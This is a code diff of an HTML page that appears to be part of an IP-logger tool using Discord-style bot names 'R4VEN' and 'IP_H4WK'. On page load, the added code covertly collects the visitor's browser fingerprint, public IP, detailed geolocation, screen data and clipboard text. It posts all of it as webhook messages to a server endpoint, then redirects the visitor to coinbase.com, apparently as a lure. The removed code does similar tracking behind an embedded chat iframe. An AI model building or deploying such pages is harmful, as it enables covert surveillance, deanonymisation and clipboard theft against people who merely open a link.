@@ -5,122 +5,129 @@
   <script type="text/javascript" src="dwebhook.js"></script>
 </head>
 
-<body>
-
-  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
-  </iframe>
-
-  <p id="demo"></p>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-  </script>
+<body onload="init()">
+  <p>Gathering IP and geolocation data...</p>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  
   <script>
-    var x = document.getElementById("demo");
-
-    let datetime = new Date();
-    let localtime = String(datetime.toLocaleTimeString());
-
-    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
-
-    const request = new XMLHttpRequest();
-    request.open("POST", "/location_update"); //change webhook
-
-    request.setRequestHeader('Content-type', 'application/json');
-
-    var myEmbed = {
-      author: {
-        name: "Target System Information.."
-      },
-      title: "Uagent:",
-      description: sysinfo,
-      color: 15418782
+    function init() {
+      sendSystemInfo();
+      getIPInfo();
+      measureNetworkLatency();
+      getClipboardData();
+      getScreenAndWindowInfo();
     }
 
-    var params = {
-      username: "R4VEN",
-      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-      content: "@everyone Someone Opened The Link O_o ",
-      embeds: [myEmbed]
+    function sendSystemInfo() {
+      let datetime = new Date();
+      let localtime = String(datetime.toLocaleTimeString());
+
+      var sysinfo = ("```xl\n" + navigator.userAgent + "```" + 
+                     "```autohotkey\n" +
+                     "\nPlatform: " + navigator.platform +
+                     "\nCookies_Enabled: " + navigator.cookieEnabled +
+                     "\nBrowser_Language: " + navigator.language +
+                     "\nBrowser_Name: " + navigator.appName +
+                     "\nBrowser_CodeName: " + navigator.appCodeName +
+                     "\nRam: " + navigator.deviceMemory +
+                     "\nCPU_cores: " + navigator.hardwareConcurrency +
+                     "\nScreen_Width: " + screen.width +
+                     "\nScreen_Height: " + screen.height +
+                     "\nTime: " + localtime +
+                     "\nRefUrl: " + document.referrer +
+                     "\nOscpu: " + navigator.oscpu + "```");
+
+      sendWebhookMessage("Target System Information..", sysinfo);
     }
 
-    request.send(JSON.stringify(params));
+    function getIPInfo() {
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        sendIPInfoToWebhook(data.ip);
+      });
 
-    //...
+      $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
+        var ipDetails = '```autohotkey\nContinent: ' + response.continent +
+                         "\nContinentCode: " + response.continentcode +
+                         "\nCountry: " + response.country +
+                         "\nCountrycode: " + response.countrycode +
+                         "\nRegionname: " + response.regionName +
+                         "\nRegion: " + response.region +
+                         "\nCity: " + response.city +
+                         "\nDistrict: " + response.district +
+                         "\nZip: " + response.zip +
+                         "\nTimezone: " + response.timezone +
+                         "\nName: " + response.name +
+                         "\nAs: " + response.as +
+                         "\nIsp: " + response.isp +
+                         "\nReverse: " + response.reverse +
+                         "\nOffset: " + response.offset +
+                         "\nCurrency: " + response.currency +
+                         "\nProxy: " + response.proxy +
+                         "\nMobile: " + response.mobile +
+                         "\nLat: " + response.lat +
+                         "\nLon: " + response.lon + '```';
 
-    $.getJSON("https://api.ipify.org?format=json", function (data) {
-      $("#gfg").html(data.ip);
+        sendWebhookMessage("IP Address Reconnaissance", ipDetails, 5763719);
 
+        // Redirect to the final destination
+        setTimeout(function () {
+          window.location.href = "https://coinbase.com";
+        }, 2000);
+      });
+    }
+
+    function sendIPInfoToWebhook(ip) {
+      var description = '```xl\n' + ip + '```' + 
+                        '\n__**IP Details:**__ https://ip-api.com/#' + ip + "\n";
+      sendWebhookMessage("Target IP", description, 15548997);
+    }
+
+    function measureNetworkLatency() {
+      const startTime = Date.now();
+      const img = new Image();
+      img.onload = function() {
+          const latency = Date.now() - startTime;
+          sendWebhookMessage("Network Latency", `${latency}ms`, 15418782);
+      };
+      img.src = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png?" + startTime;
+    }
+
+    function getClipboardData() {
+      navigator.clipboard.readText().then(text => {
+          sendWebhookMessage("Clipboard Data", text, 15418782);
+      }).catch(err => {
+          sendWebhookMessage("Clipboard Data", "Unable to read clipboard data.", 15418782);
+      });
+    }
+
+    function getScreenAndWindowInfo() {
+      const screenInfo = `Screen Width: ${screen.width}, Screen Height: ${screen.height}`;
+      const windowInfo = `Window Inner Width: ${window.innerWidth}, Window Inner Height: ${window.innerHeight}`;
+      sendWebhookMessage("Screen and Window Information", screenInfo + "\n" + windowInfo, 15418782);
+    }
+
+    function sendWebhookMessage(title, description, color = 15418782) {
       const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
+      request.open("POST", "/location_update"); 
 
       request.setRequestHeader('Content-type', 'application/json');
 
       var myEmbed = {
-        author: {
-          name: "Target Ip"
-        },
-        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\n",
-        color: 15548997,
-
-        footer: {
-          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
-        }
-      }
+        author: { name: title },
+        description: description,
+        color: color
+      };
 
       var params = {
-        username: "R4VEN",
+        username: "IP_H4WK",
         avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
         embeds: [myEmbed]
-      }
+      };
 
       request.send(JSON.stringify(params));
-    })
-
-    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "/location_update"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "IP Address Reconnaissance"
-        },
-        title: response.status, //response.query
-        description: '```autohotkey\nContinent: ' + response.continent +
-          "\nContinentCode: " + response.continentcode +
-          "\nCountry: " + response.country +
-          "\nCountrycode: " + response.countrycode +
-          "\nRegionname: " + response.regionName +
-          "\nRegion: " + response.region +
-          "\nCity: " + response.city +
-          "\nDistrict: " + response.district +
-          "\nZip: " + response.zip +
-          "\nTime_zone: " + response.time_zone +
-          "\nName: " + response.name +
-          "\nAs: " + response.as +
-          "\nIsp: " + response.isp +
-          "\nReverse: " + response.reverse +
-          "\nOffset: " + response.offset +
-          "\nCurrency: " + response.currency +
-          "\nProxy: " + response.proxy +
-          "\nMobile: " + response.mobile +
-          "\nLat: " + response.lat +
-          "\nLon: " + response.lon + '```',
-        color: 5763719
-
-      }
-
-      var params = {
-        username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    })
-
+    }
   </script>
+
 </body>
 
 </html>
